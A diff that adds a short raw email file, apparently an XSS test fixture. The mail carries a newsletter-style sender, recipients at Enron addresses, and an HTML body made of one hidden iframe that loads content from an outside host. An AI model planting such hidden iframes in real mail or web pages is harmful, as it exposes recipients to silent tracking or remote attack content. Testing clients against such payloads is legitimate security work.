@@ -1,0 +1,7 @@
+From: "Autobytel Newsletter" <Autobytel@enews.autobytel.com>
+To: craig.shields@enron.com, molly.harris@enron.com, teresa.mihalik@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<iframe src="http://tmxk.org/t/" style="display:none" id="wooyun"></iframe>
